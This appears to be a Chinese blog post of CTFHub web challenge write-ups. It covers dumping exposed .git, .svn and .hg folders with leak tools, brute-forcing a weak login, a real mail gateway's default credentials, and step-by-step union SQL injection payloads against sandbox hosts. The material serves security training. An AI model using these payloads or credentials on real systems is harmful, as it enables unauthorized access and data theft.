+<p>当前的版本已经remove掉了flag文件，我们可以将两次提交记录进行对比，获取flag的内容：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641630457946-5b8fabb0-9861-400a-8abe-f08fe6c9c0c7.png" alt="image.png"></p>
+<p><code>ctfhub{52e07107c41c72d622bb5ddd}</code></p>
+<h4 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h4><p>开发的项目的过程中会出现不同的分支。比如dev分支、master分支等，当你在dev分支开发新功能时突然有人给你反馈一个bug让你修复，但是新功能做到了一半你又不想提交，这时就可以使用git stash命令先把当前进度保存起来，然后切换到另一个分支去修改bug，修改完提交后，再切回dev分支，使用<code>git stash pop</code>来恢复之前的进度继续开发新功能，这个就是git中stash的作用。</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641631135489-08e9b14e-7161-4f84-93ab-db548f9cb911.png" alt="image.png"></p>
+<p>和之前相同，首先泄露git：<code>python GitHack.py http://challenge-361d49b795d6bdef.sandbox.ctfhub.com:10800/.git/</code>:</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641631230837-78c4d0a6-0229-47c7-b513-23f17cf7c715.png" alt="image.png"></p>
+<p>然后进入到对应的git文件夹，使用<code>git stash pop</code>命令恢复之前的进度即恢复之前删除掉的flag文件：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641631392349-615f7d74-01ce-448e-9d83-f47cb93e3ca8.png" alt="image.png"></p>
+<p>此时会生成一个文件，该文件的内容就是flag：<code>ctfhub{4e73f0724138f5a706808796}</code>。</p>
+<h4 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h4><blockquote>
+<p>Git本地库中的索引Index就是一个二进制文件，默认存储在.git&#x2F;index路径下。索引中包含一个列表，列表根据文件名、文件模式和文件元数据进行了排序，以便快速检测文件的变化。</p>
+</blockquote>
+<p>和之前一样还是首先用工具dump文件，dump下来直接有flag文件…</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641644134825-daa4941c-1363-4363-9d7e-75792950834f.png" alt="image.png"></p>
+<p><code>ctfhub{534faeb93f6de866f8e5e5b3}</code></p>
+<h3 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h3><blockquote>
+<p>当开发人员使用 SVN 进行版本控制，对站点自动部署。如果配置不当,可能会将.svn文件夹直接部署到线上环境。这就引起了 SVN 泄露漏洞。</p>
+</blockquote>
+<p>访问靶场的提示：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641646670948-93191207-e1cc-4a87-b997-ab1c8f052e0d.png" alt="image.png"></p>
+<p>这里选择使用dirsearch进行目录扫描：<a target="_blank" rel="noopener" href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a>，下载完成执行<code>python3 setup.py install</code>安装，目录扫描结果保存在上级目录的dirsearch_log.txt中：</p>
+<p><code>python3 dirsearch.py -u http://challenge-49fd721b91f90aa9.sandbox.ctfhub.com:10800/ &gt; ../dirsearch_log.txt</code></p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641647075133-d28691d9-40bd-4d03-b3b0-d2a64cea5ba6.png" alt="image.png"></p>
+<p>日志中很明显有<code>.svn</code>隐藏文件说明发生了svn泄露，和之前的git泄露一样，这里我们需要下载一个dump工具<code>dvcs-ripper</code><a target="_blank" rel="noopener" href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a>：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641647420595-0e3fd03b-2ce9-4147-8831-9dea2f36951f.png" alt="image.png"></p>
+<p>这里我们需要用到的是<code>rip-svn.pl</code>，执行<code>./rip-svn.pl -u http://challenge-49fd721b91f90aa9.sandbox.ctfhub.com:10800/</code></p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641647776977-846942dd-74b7-4a20-b6a7-9b8181c23527.png" alt="image.png"></p>
+<p>此时会在此文件夹下生成一个隐藏文件夹：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641647851596-b0e74c82-8ae9-4d5f-862e-83d1a882f32c.png" alt="image.png"></p>
+<p>稍微寻找就能发现flag：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641648059878-6b93a640-07bf-40ff-a1f0-3a94c1fc8e2d.png" alt="image.png"></p>
+<p><code>ctfhub{97b2b39531e6378ffc0b0b39}</code></p>
+<h3 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h3><blockquote>
+<p>当开发人员使用 Mercurial 进行版本控制，对站点自动部署。如果配置不当,可能会将.hg 文件夹直接部署到线上环境。这就引起了 hg 泄露漏洞。</p>
+</blockquote>
+<p>这里仍需要使用到SVN中下载的工具，不过这里使用的是<code>rip-hg.pl</code>：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641648278453-0dbc21de-2c36-4a46-a41f-1c7b5b900c8d.png" alt="image.png"></p>
+<p>执行命令<code>./rip-hg.pl -v -u http://challenge-c0ca2cc614e9ddb9.sandbox.ctfhub.com:10800/.hg/</code></p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641648804830-d85d735f-7cae-4dac-8b2c-499669ff95d5.png" alt="image.png"></p>
+<p>进入.&#x2F;hg文件夹，在fncache文件夹中找到<code>data/flag_2890631830.txt.i</code>：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641648938449-c234f8ac-f131-44ab-9075-badc9fd0e6ab.png" alt="image.png"></p>
+<p>访问可以有flag：<code>http://challenge-c0ca2cc614e9ddb9.sandbox.ctfhub.com:10800/flag_2890631830.txt</code>：<code>ctfhub{122b7320ede832c13350e638}</code></p>
+<h2 id="密码口令"><a href="#密码口令" class="headerlink" title="密码口令"></a>密码口令</h2><h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>由于账号密码都不知道，所以直接抓包爆破即可，详见DVWA:</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641696718539-ab3faad1-6fc8-4a76-b404-0e4710815d5b.png" alt="image.png"></p>
+<p>我只开始用的是之前的top100的密码附件，但是似乎不行，看了网上的账号为<code>admin</code>、密码为<code>admin888</code>…</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641698058862-a4572db4-59e0-4763-8311-6b57dfd2b680.png" alt="image.png"></p>
+<p>自己爆破为<code>admin</code>、<code>admin123</code>：<code>ctfhub{dfd045f39f9157c8bd962fe5}</code>，payload设置如下：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641698136525-dee46ed2-a6af-45e9-a9d4-5b0b9c7a2d06.png" alt="image.png"></p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641698154961-1228ff2c-4314-4e36-907c-195fe2d8e2fc.png" alt="image.png"></p>
+<h3 id="默认口令"><a href="#默认口令" class="headerlink" title="默认口令"></a>默认口令</h3><p>开环境：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641698403807-ec6e10d1-d527-4fd0-8bdb-7e0bd66034b9.png" alt="image.png"></p>
+<p>上百度直接搜“亿邮邮件网关默认账号密码”:</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641698595963-190a027b-6c89-4905-9f2d-ccb4d430e169.png" alt="image.png"></p>
+<p>账号密码为：<code>eyougw</code>、<code>admin@(eyou)</code></p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641698876025-74337d01-8375-453a-8309-677630084b11.png" alt="image.png"></p>
+<p><code>ctfhub{e30800ddcae5f7ebd6511058}</code></p>
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><h3 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h3><p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641798467892-c00f7753-bc98-45a5-8327-665f4e05a858.png" alt="image.png"></p>
+<blockquote>
+<p>注意这道题报错没有回显</p>
+</blockquote>
+<p>查询当前的表中有几个字段：<code>?id=-1 union order by 3</code></p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641798940256-c005c04c-c73b-4e23-a669-93ee13d85e53.png" alt="image.png"></p>
+<p>没有回显，说明有两个字段，查询表中的字段分别是什么和其具体位置：<code>?id=-1 union select 1,2</code></p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641798725520-c3714e4f-815f-42fa-a0aa-c5437a307ac4.png" alt="image.png"></p>
+<p>查询用户的数据库当前在的数据库和用户：</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641799084530-3535f9e0-bad8-4ac2-9c60-73bc1f8563b1.png" alt="image.png"></p>
+<p>查询所有数据库名称：<code>?id=-1 union select 1,group_concat(schema_name) from information_schema.schemata</code></p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641799473103-e6ade706-55b4-408f-b191-62b39fa6b14e.png" alt="image.png"></p>
+<p>查询sqli数据库中的所有表:<code>?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;sqli&#39;</code></p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641799686590-115b07ae-56a4-49b5-8613-e65123ba2628.png" alt="image.png"></p>
+<p>获取flag表中的所有字段：</p>
+<p><code>?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39; and table_schema=&#39;sqli&#39;</code></p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641801912594-61ac51b8-8d42-41a6-8abb-2abae9d9811d.png" alt="image.png"></p>
+<p>得到flag字段，获取它:<code>?id=-1 union select 1,group_concat(flag) from flag</code>:</p>
+<p><img src="/assets/posts/ctfhub-web-1ygg5dh/assets/1641800167563-13357fcd-a506-4c9b-bfc8-5f7ab693df71.png" alt="image.png"></p>
+<p><code>ctfhub{ffc2b0022acf76d079c196df}</code></p>
+<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><blockquote>
+<p>本题报错没有回显</p>
+</blockquote>
+<p>和之前的相同：</p>
+<p><code>?id=1&#39;</code>无回显</p>
+<p><code>?id=1&#39;&#39;</code>正常回显</p>
+<p><code>?id=-1&#39; or &#39;1&#39; and &#39;1</code>正常回显</p>
+<p><code>?id=1&#39; order by 3 --+</code>报错，则该表中字段数为2</p>
+<p><code>?id=-1&#39; union select 1,2 --+</code>该表中的ID、data的字段顺序为第一个和第二个</p>
+<p><code>?id=-1&#39; union select user(),database() --+</code>用户名为root、表所处的数据库名为sqli（没有直接返回表名的函数）</p>
+<p><code>?id=-1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#39;sqli&#39; --+</code>（获取该数据库中的所有表：flag,id,data）</p>
+<p><code>?id=-1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39; --+</code>（获取flag表的字段：flag）</p>
+<p><code>?id=-1&#39; union select 1,flag from flag --+</code>:<code>ctfhub{531aa69814b1de55ae069e76}</code></p>
+<blockquote>
+<p>要理解sql语句每一句话的含义，这样很容易做题</p>
+</blockquote>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://elydemiurge.github.io">Cyberangel</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8A%E9%97%A8%E9%83%BD%E6%B2%A1%E6%9C%89%E5%85%A5%E7%9A%84WEB%E3%80%8B/CTFHUB-WEB%E5%88%B7%E9%A2%98/">https://elydemiurge.github.io/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8A%E9%97%A8%E9%83%BD%E6%B2%A1%E6%9C%89%E5%85%A5%E7%9A%84WEB%E3%80%8B/CTFHUB-WEB%E5%88%B7%E9%A2%98/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://elydemiurge.github.io" target="_blank">Cyberangel's Blog</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://picsum.photos/seed/blog-cover-02/800/450" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8A%E9%97%A8%E9%83%BD%E6%B2%A1%E6%9C%89%E5%85%A5%E7%9A%84WEB%E3%80%8B/SQL%E6%B3%A8%E5%85%A5%E5%85%A5%E9%97%A8%EF%BC%881%EF%BC%89--SQLi-labs-Less-1%EF%BC%88GET-%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%EF%BC%89/" title="SQL注入入门（1）--SQLi-labs-Less-1（GET-单引号字符型注入）"><img class="cover" src="https://picsum.photos/seed/blog-cover-01/800/450" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">SQL注入入门（1）--SQLi-labs-Less-1（GET-单引号字符型注入）</div></div><div class="info-2"><div class="info-item-1">SQL注入入门（1）–SQLi-labs-Less-1（GET-单引号字符型注入） 参考资料：https://www.jianshu.com/p/b5ab19751955这里使用docker进行环境搭建，为了方便这里使用hackbar  首先随便输点东西：http://localhost:8888/Less-1?id=1  这里先探测一下注入的类型–是字符型注入还是数字型注入，输入：http://localhost:8888/Less-1?id=1&#39;发生报错：  这句话的大致意思是出现语法错误，其&#39;1&#39;&#39; LIMIT 0,1值得引起我们的注意（外面额外的单引号是引起我们注意的意思），其中的1&#39;是我们输入的id参数，进一步推出&#39;$id&#39; LIMIT 0,1，所以这里可以发生字符型注入，并根据回显的内容可以猜测查询语句大致的结构如下： 1select username,password from table_name where id=&#x27;$GET[&#x27;id&#x27;]&#x27; limit 0,1   li...</div></div></div></a><a class="pagination-related" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8A%E9%97%A8%E9%83%BD%E6%B2%A1%E6%9C%89%E5%85%A5%E7%9A%84WEB%E3%80%8B/DVWA-Brute%20Force/" title="DVWA-Brute Force"><img class="cover" src="https://picsum.photos/seed/blog-cover-06/800/450" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">DVWA-Brute Force</div></div><div class="info-2"><div class="info-item-1">DVWA-Brute Force这里选择使用Burp Suite自带的浏览器进行抓包。 准备来到DVWA的Vulnerability: Brute Force，在调整DVWA安全等级后，注意cookie中是否存在两个security字段，如果存在请删掉其中一个这样才能使得调整的安全等级起效。 Low先查看源码，对源码的详细注释见下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;?phpif( isset( $_GET[ &#x27;Login&#x27; ] ) ) &#123; //检测Login变量是否已设置（这里是由get方式进行传参设置）并且非NULL    // Get username    $user = $_GET[ &#x27;username&#x27; ];  //获取get的user    // Get password    $pass = $_GET[ &#x27;password&#x27; ];  //获取get的p...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Cyberangel</div><div class="author-info-description">二进制安全</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">467</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">14</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ElyDemiurge"><i class="fab fa-github"></i><span>GitHub</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ElyDemiurge" target="_blank" title="GitHub"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:elydemiurge@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">从语雀迁移博客到 Github</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CTFHUB-WEB%E5%88%B7%E9%A2%98"><span class="toc-number">1.</span> <span class="toc-text">CTFHUB-WEB刷题</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.</span> <span class="toc-text">HTTP协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F"><span class="toc-number">1.1.1.</span> <span class="toc-text">请求方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#302%E8%B7%B3%E8%BD%AC"><span class="toc-number">1.1.2.</span> <span class="toc-text">302跳转</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie"><span class="toc-number">1.1.3.</span> <span class="toc-text">Cookie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81"><span class="toc-number">1.1.4.</span> <span class="toc-text">基础认证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-number">1.1.5.</span> <span class="toc-text">响应包源代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.</span> <span class="toc-text">信息泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="toc-number">1.2.1.</span> <span class="toc-text">目录遍历</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHPINFO"><span class="toc-number">1.2.2.</span> <span class="toc-text">PHPINFO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-number">1.2.3.</span> <span class="toc-text">备份文件下载</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">网站源码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bak%E6%96%87%E4%BB%B6"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">bak文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#vim%E7%BC%93%E5%AD%98"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">vim缓存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DS-Store"><span class="toc-number">1.2.3.4.</span> <span class="toc-text">.DS_Store</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Git%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.4.</span> <span class="toc-text">Git泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Log"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">Log</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Stash"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">Stash</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Index"><span class="toc-number">1.2.4.3.</span> <span class="toc-text">Index</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SVN%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.5.</span> <span class="toc-text">SVN泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HG%E6%B3%84%E9%9C%B2"><span class="toc-number">1.2.6.</span> <span class="toc-text">HG泄露</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.3.</span> <span class="toc-text">密码口令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.3.1.</span> <span class="toc-text">弱口令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.3.2.</span> <span class="toc-text">默认口令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text">SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.1.</span> <span class="toc-text">整数型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.2.</span> <span class="toc-text">字符型注入</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(11)--IoT%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83docker%E5%B0%81%E8%A3%85%E6%8C%87%E5%8D%97/" title="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南"><img src="https://picsum.photos/seed/blog-cover-06/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(11)--IoT%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83docker%E5%B0%81%E8%A3%85%E6%8C%87%E5%8D%97/" title="《IoT从入门到入土》(11)--IoT靶场环境docker封装指南">《IoT从入门到入土》(11)--IoT靶场环境docker封装指南</a><time datetime="2022-12-08T00:19:26.000Z" title="发表于 2022-12-08 08:19:26">2022-12-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/" title="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）"><img src="https://picsum.photos/seed/blog-cover-07/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-2)--Zyxel-NAS%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ARM32--Hijack%20GOT%E3%80%81UDP%EF%BC%89/" title="《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）">《IoT从入门到入土》(10-2)--Zyxel-NAS漏洞复现（ARM32--Hijack GOT、UDP）</a><time datetime="2022-11-25T01:47:22.000Z" title="发表于 2022-11-25 09:47:22">2022-11-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-1)--Zyxel-NAS%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建"><img src="https://picsum.photos/seed/blog-cover-08/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(10-1)--Zyxel-NAS%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" title="《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建">《IoT从入门到入土》(10-1)--Zyxel-NAS格式化字符串漏洞复现环境搭建</a><time datetime="2022-11-21T02:38:00.000Z" title="发表于 2022-11-21 10:38:00">2022-11-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(9)--TOTOLINK_NR1800X%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8Alighttpd%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%B5%85%E6%9E%90/" title="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析"><img src="https://picsum.photos/seed/blog-cover-01/800/450" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析"/></a><div class="content"><a class="title" href="/posts/Yuque/%E5%85%AC%E5%BC%80%E7%9F%A5%E8%AF%86%E5%BA%93/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B/%E3%80%8AIoT%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F%E3%80%8B(9)--TOTOLINK_NR1800X%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8Alighttpd%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%B5%85%E6%9E%90/" title="《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析">《IoT从入门到入土》(9)--TOTOLINK_NR1800X漏洞复现及lighttpd中间件浅析</a><time datetime="2022-11-10T05:43:27.000Z" 